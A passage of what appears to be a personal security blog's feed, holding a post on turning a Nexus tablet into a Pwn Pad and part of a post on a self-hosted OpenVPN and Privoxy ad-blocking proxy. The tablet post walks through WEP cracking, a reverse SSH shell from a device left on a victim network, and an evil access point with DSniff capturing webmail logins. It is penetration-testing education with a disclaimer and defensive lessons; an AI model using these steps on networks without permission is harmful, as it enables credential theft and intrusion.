use VPN&lt;/li&gt;&lt;/ol&gt;&lt;div style=&quot;&quot;&gt;Because hacking has never been so easy before.&lt;br /&gt;And last but not least, if you like the DSploit project, don't forget to &lt;a href=&quot;http://dsploit.net/donate/&quot;&gt;donate&lt;/a&gt; them!&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>WiFi hacking on tablets</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/hacking/pwn/pad/tablet/wep/2014/04/22/WiFi-hacking-on-tablets.html"/>
   <updated>2014-04-22T13:56:42+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/hacking/pwn/pad/tablet/wep/2014/04/22/WiFi-hacking-on-tablets</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://jumpespjump.blogspot.be/p/disclaimer.html&quot; target=&quot;_blank&quot;&gt;Disclaimer&lt;/a&gt;: Don't hack anything where you don't have the authorization to do so. Stay legal.&lt;br /&gt;&lt;br /&gt;Ever since I bought my first Android device, I wanted to use the device for WEP cracking. Not because I need it, but I want it :) After some googling, I read that you can't use your WiFi chipset for packet injection, and I forgot the whole topic.&lt;br /&gt;&lt;br /&gt;After a while, I read about hacking on tablets (this was around a year ago), and my first opinion was: &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&quot;This is stupid, lame, and the usage of that can be very limited&quot;.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;After playing one day with it, my opinion just changed: &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&quot;This is stupid, lame, the usage is limited, but when it works, it is really funny :-)&quot;&lt;br /&gt;&lt;br /&gt;At the beginning I looked at the Pwn Pad as a device that can replace a pentest workstation, working at the attacker side. Boy was I wrong. Pwn Pad should be used as a pentest device deployed at the victim's side!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;You have the following options:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;You have 1095 USD + VAT + shipping to buy &lt;a href=&quot;https://www.pwnieexpress.com/penetration-testing-vulnerability-assessment-products/sensors/pwn-pad-2014/&quot;&gt;this&lt;/a&gt; Pwn Pad&lt;/li&gt;&lt;li&gt;You have around 200 USD to buy an old Nexus 7 tablet, a USB OTG cable, a USB WiFi dongle (e.g. TP-Link Wireless TL-WN722N USB adapter works).&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/2014-04-20+10.48.29_cleaned.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/2014-04-20+10.48.29_cleaned.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/2014-04-20+10.48.29_cleaned.jpg&quot; width=&quot;240&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;In my example, I bought a used, old 2012 Nexus WiFi. Originally I bought this to play with different custom Android ROMs, and play with rooted applications. After a while, I found this Pwn Pad hype again and gave it a shot.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The &lt;a href=&quot;https://www.pwnieexpress.com/support/downloads/&quot;&gt;Pwn Pad community edition&lt;/a&gt; has an &lt;a href=&quot;http://sourceforge.net/projects/pwnpad/files/?source=navbar&quot;&gt;easy-to-use installer&lt;/a&gt;, with a proper &lt;a href=&quot;http://www.pwnieexpress.com/wp-content/uploads/2013/12/PwnPadCommunityEdition-FactoryImageInstallationGuide.pdf&quot;&gt;installation description&lt;/a&gt;. Don't forget to backup everything from your tablet before installing Pwn Pad on it!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;I don't want to repeat the install guide, it is as easy as ABC. I booted a Ubuntu Live CD, installed adb and fastboot, and it was ready-to-roll. I have not measured the time, but the whole process was around 20 minutes.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screenshot_2014-04-17-13-25-13.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Screenshot_2014-04-17-13-25-13.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screenshot_2014-04-17-13-25-13.png&quot; width=&quot;250&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The internal WiFi chipset can be used to sniff traffic or even ARP poisoning for active MiTM. But in my case, I was not able to use the internal chipset for packet injection, which means you can't use it for WEP cracking, WPA disauth, etc. This is where the external USB WiFi comes handy. And this is why we need the Pwn Pad Android ROM, and can't use an average ROM.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;There are two things where Pwn Pad really rocks. The first one is the &lt;u&gt;integrated drivers for&lt;/u&gt; the external WiFi with monitor mode and &lt;u&gt;packet injection&lt;/u&gt; capabilities. The second cool thing is the &lt;u&gt;chroot wrapper&lt;/u&gt; around the Linux hacking tools. Every hacking tool has a start icon, so it feels like it is a native Android application, although it is running in a &lt;u&gt;chroot Kali&lt;/u&gt; environment.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;h3&gt;Wifite&lt;/h3&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The first recommended app is Wifite. Think of it as a wrapper around the aircrack - airmon - airodump suite. My biggest problem with WEP cracking was that I had to remember a bunch of commands, or have the WEP cracking manual with me every time I have to crack it. It was overcomplicated. But thanks to Wifite, that is past.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;In order to crack a WEP key, you have to:&lt;br /&gt;&lt;ol&gt;&lt;li&gt;Start the Wifite app&lt;/li&gt;&lt;li&gt;Choose your adapter (the USB WiFi)&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screenshot_2014-04-17-13-47-00.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Screenshot_2014-04-17-13-47-00.png&quot; style=&quot;margin-left: 1em; margin-right: 1em; text-align: center;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screenshot_2014-04-17-13-47-00.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/li&gt;&lt;li&gt;Choose the target network (wep_lan in the next example)&lt;/li&gt;&lt;li&gt;Wait for a minute &lt;/li&gt;&lt;li&gt;PROFIT!&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/p.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/p.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/p.png&quot; width=&quot;297&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;h3&gt;SSH reverse shell&lt;/h3&gt;This is one of the key functionalities of the Pwn Pad. You deploy the tablet at the Victim side, and let the tablet connect to your server via (tunneled) SSH.&lt;br /&gt;&lt;br /&gt;The basic concept of the reverse shells are that an SSH tunnel is established between the Pwn Pad tablet (client) and your external SSH server (either directly or encapsulated in other tunneling protocol), and remote port forward is set up, which means on your SSH server you connect to a localport which is forwarded to the Pwn Pad and handled by the Pwn Pad SSH server.&lt;br /&gt;&lt;br /&gt;I believe the best option would be to use the reverse shell over 3G, and let the tablet connect to the victim network through Ethernet or WiFi. But your preference might vary. The steps for reverse shells are again well documented in the &lt;a href=&quot;http://www.pwnieexpress.com/wp-content/uploads/2013/12/PwnieExpressUserManual-PwnPad.pdf&quot;&gt;documentation&lt;/a&gt;, except that by default you also have to start the SSH server on the Pwn Pad. It is not hard, there is an app for that ;-) On your external SSH server you might need to install stunnel and ptunnel if you are not using Kali. The following output shows what you can see on your external SSH server after successful reverse shell.&lt;br /&gt;&lt;br /&gt;&lt;pre class=&quot;prettyprint bash&quot;&gt;root@myserver:/home/ubuntu# ssh -p 3333 pwnie@localhost&lt;br /&gt;The authenticity of host '[localhost]:3333 ([127.0.0.1]:3333)' can't be established.&lt;br /&gt;ECDSA key fingerprint is 14:d4:67:04:90:30:18:a4:7a:f6:82:04:e0:3c:c6:dc.&lt;br /&gt;Are you sure you want to continue connecting (yes/no)? yes&lt;br /&gt;Warning: Permanently added '[localhost]:3333' (ECDSA) to the list of known hosts.&lt;br /&gt;pwnie@localhost's password:&lt;br /&gt;  _____      ___  _ ___ ___   _____  _____ ___ ___ ___ ___&lt;br /&gt; | _ \ \    / / \| |_ _| __| | __\ \/ / _ \ _ \ __/ __/ __|&lt;br /&gt; |  _/\ \/\/ /| .` || || _|  | _| &amp;gt;  &amp;lt;|  _/   / _|\__ \__ \&lt;br /&gt; |_|   \_/\_/ |_|\_|___|___| |___/_/\_\_| |_|_\___|___/___/&lt;br /&gt;&lt;br /&gt; Release Version: 1.5.5&lt;br /&gt; Release Date: 2014-01-30&lt;br /&gt; Copyright 2014 Pwnie Express. All rights reserved.&lt;br /&gt;&lt;br /&gt; By using this product you agree to the terms of the Rapid Focus&lt;br /&gt; Security EULA: http://pwnieexpress.com/pdfs/RFSEULA.pdf&lt;br /&gt;&lt;br /&gt; This product contains both open source and proprietary software.&lt;br /&gt; Proprietary software is distributed under the terms of the EULA.&lt;br /&gt; Open source software is distributed under the GNU GPL:&lt;br /&gt; http://www.gnu.org/licenses/gpl.html&lt;br /&gt;&lt;br /&gt;pwnie@localhost:~$&lt;br /&gt;&lt;/pre&gt;&lt;div&gt;&lt;br /&gt;Now you have a shell on a machine that is connected to the victim network. Sweet :) Now Metasploit really makes sense on the tablet, and all other command-line tools.&lt;br /&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;EvilAP and DSniff&lt;/h3&gt;Start EvilAP (it is again a wrapper around airobase), choose interface (for me the Internal Nexus Wifi worked), enter an SSID (e.g freewifi), enter channel, choose whether force all clients to connect to you or just those who really want to connect to you, and start.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/evilap.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/evilap.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/evilap.png&quot; width=&quot;250&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;The next step is to start DSniff, choose interface at0, and wait :) In this example, I used a popular Hungarian webmail, which has a checkbox option for &quot;secure&quot; login (with default off). There are sooo many problems with this approach, e.g. you can't check the certificate before connecting, and the login page is delivered over HTTP, so one can disable the secure login checkbox seamlessly in the background, etc. In this case, I left the &quot;secure&quot; option on default off.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/dsniff_1.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/dsniff_1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/dsniff_1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/dsniff2.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/dsniff2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/dsniff2.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;In the next tutorial, I'm going to show my next favorite app, DSploit ;)&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Lessons learned&lt;/h3&gt;Hacking has been never so easy before&lt;br /&gt;In a home environment, only use WPA2 PSK&lt;br /&gt;Choose a long, nondictionary passphrase as the password for WPA2&lt;br /&gt;Don't share your WiFi passwords with people you don't trust, or change it when they don't need it anymore&lt;br /&gt;Don't let your client device auto-connect to WiFi stations, even if the SSID looks familiar&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;I believe during an engagement a Pwn Plug has better &quot;physical cloaking&quot; possibilities, but playing with the Pwn Pad Community Edition really gave me fun moments.&lt;br /&gt;&lt;br /&gt;And last but not least I would like to thank to the Pwn Pad developers for releasing the Community Edition!&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>BYOPPP - Build your own privacy protection proxy</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/openvpn/privacy/privoxy/2014/04/01/BYOPPP-Build-your-own-privacy-protection-proxy.html"/>
   <updated>2014-04-01T13:57:28+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/openvpn/privacy/privoxy/2014/04/01/BYOPPP---Build-your-own-privacy-protection-proxy</id>
   <content type="html">&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;I have read a &lt;a href=&quot;http://lifehacker.com/5978098/turn-a-raspberry-pi-into-a-personal-vpn-for-secure-browsing-anywhere-you-go/all&quot;&gt;blog post&lt;/a&gt;, where you can build your own privacy proxy server built on Raspberry PI. The post got me thinking about how I can use this to protect my privacy on my Android phone, and also get rid of those annoying ads. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Since I own a Samsung Galaxy S3 LTE with Android 4.3 (with a HW based Knox counter), rooting the phone now means you &lt;a href=&quot;http://forum.xda-developers.com/galaxy-s3/general/to-root-s3-lte-android-4-3-t2567118&quot;&gt;break Knox, and loose warranty&lt;/a&gt;. Past the point of no return ...&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;This means I have to solve this without root. Luckily newer Androids support VPN without rooting, but setting a mandatory system-wide proxy is still not possible without root. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;But thanks to some iptables magic and Privoxy, this is not a problem anymore :) &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The ingredients to build your own privacy protection proxy:&lt;/div&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;One (or more) cheap VPS server(s)&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;a decent VPN program&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Privoxy&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;iptables&lt;/li&gt;&lt;/ul&gt;
&lt;ul&gt;&lt;/ul&gt;
&lt;h2&gt;VPS server&lt;/h2&gt;
&lt;div style=&quot;&quot;&gt;To get the cheap VPS server, I recommend using Amazon EC2, but choose whatever you like. The micro instance is very cheap (&lt;a href=&quot;http://aws.amazon.com/free/&quot;&gt;or even free&lt;/a&gt;), and has totally enough resources for this task. I'm using the Ubuntu free tier now and it works like a charm. And last but not least Amazon has two-factor authentication! You can set up an Ubuntu server under 10 minutes. Use the AWS region nearest to you, e.g. I choose EU - Ireland.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/aws_3.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/aws_3.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/aws_3.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/aws_2.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/aws_2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/aws_2.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;VPN&lt;/h2&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;For the VPN program, I recommend the free version of the OpenVPN AS (EDIT: be sure to use &lt;a href=&quot;https://community.openvpn.net/openvpn/wiki/heartbleed&quot;&gt;OpenVPN AS 2.0.6&lt;/a&gt; or later, both on the server and the client). &lt;a href=&quot;https://openvpn.net/index.php/access-server/docs/quick-start-guide.html&quot;&gt;Easy to set-up quick start guide is here&lt;/a&gt;, GUI based configuration, and one-click client installer for Android, iOS, Windows, Linux, OSX. The Ubuntu installer packages are &lt;a href=&quot;https://openvpn.net/index.php/access-server/download-openvpn-as-sw/113.html?osfamily=Ubuntu&quot;&gt;here&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/openvpn1.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/openvpn1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/openvpn1.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/openvpn2.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/openvpn2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/openvpn2.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/openvpn3.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/openvpn3.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/openvpn3.png&quot; width=&quot;330&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The most important settings:&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;I prefer to use the TCP 443 and UDP 53 ports for my OpenVPN setup, and let the user guess why. &lt;/li&gt;&lt;li&gt;For good performance, UDP is preferred over TCP. &lt;/li&gt;&lt;li&gt;VPN mode is Layer 3 (routing/NAT).&lt;/li&gt;&lt;li&gt;Don't forget to allow the configured VPN ports in the AWS firewall (security groups). &lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/aws_security_groups.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/aws_security_groups.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/aws_security_groups.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Other VPN settings:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;div&gt;&lt;ul&gt;&lt;li&gt;Should VPN clients have access to private subnets (non-public networks on the server side)? - Yes&lt;/li&gt;&lt;li&gt;Should client Internet traffic be routed through the VPN? - Yes&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div&gt;&lt;h2&gt;&lt;/h2&gt;&lt;h2&gt;Privoxy&lt;/h2&gt;The next component we have to install and configure is Privoxy. As usual, &quot;apt-get install privoxy&quot; just works. The next step is to configure privoxy via /etc/privoxy/config file, there are two options to change:&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;ul&gt;&lt;li&gt;listen-address your.ip.add.ress:8118&lt;/li&gt;&lt;li&gt;accept-intercepted-requests 1&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Beware not to allow everyone accessing your Privoxy server in the AWS EC2 security groups, be sure it is reachable only to VPN users!&lt;br /&gt;&lt;br /&gt;After everything is set, start privoxy with &quot;service privoxy start&quot;, and add it to the autostart &quot;update-rc.d privoxy defaults&quot;.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;h2&gt;Iptables&lt;/h2&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;And the final step is to configure your iptables chain to forward every web traffic from the VPN clients to the Privoxy server:&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;pre class=&quot;prettyprint&quot;&gt;iptables -t nat -A PREROUTING -s 5.5.0.0/16 -p tcp -m multiport --dports 80,8080,81 -j DNAT --to-destination your.ip.add.ress:8118&lt;br /&gt;&lt;/pre&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Optionally you can block access to all other ports as well, and what does not go through your Privoxy won't be reachable.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Based on your Linux distribution and preference, you might make this rule persistent.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;h3&gt;Final test&lt;/h3&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Now you can connect to the VPN server from your Android device.&lt;br /&gt;&lt;div&gt;After logging in from a client, you get the following nice packages to install on your device:&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/openvpn.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/openvpn.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/openvpn.png&quot; width=&quot;297&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/2014-04-01+08.57.36.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/2014-04-01+08.57.36.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/2014-04-01+08.57.36.png&quot; width=&quot;180&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;After connecting, the final results can be seen in the following screenshots. And yes, there is a reason I chose &lt;a href=&quot;http://www.fireeye.com/blog/technical/mobile-threats/2014/03/a-little-bird-told-me-personal-information-sharing-in-angry-birds-and-its-ad-libraries.html&quot;&gt;Angry Birds&lt;/a&gt; as an example.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;table align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/2014-03-28+22.10.53.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/2014-03-28+22.10.53.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/2014-03-28+22.10.53.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Angry Birds without Privoxy&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;table align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/2014-03-28+22.13.21.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/2014-03-28+22.13.21.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/2014-03-28+22.13.21.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Angry Birds with Privoxy&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;table align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/2014-03-28+22.15.11.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/2014-03-28+22.15.11.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/2014-03-28+22.15.11.png&quot; width=&quot;180&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Stupid flashlight app with ad&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;table align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/2014-03-28+14.22.00.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/2014-03-28+14.22.00.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/2014-03-28+14.22.00.png&quot; width=&quot;180&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Stupid flashlight app with Privoxy&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Spoiler alert&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If you are afraid of NSA tracking you, this post is not for you. If you want to achieve IP layer anonymity, this post is not for you. As long as you are the only one using that service, it should be trivial to see what could possibly go wrong with that.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Known issues&lt;/b&gt;&lt;/div&gt;
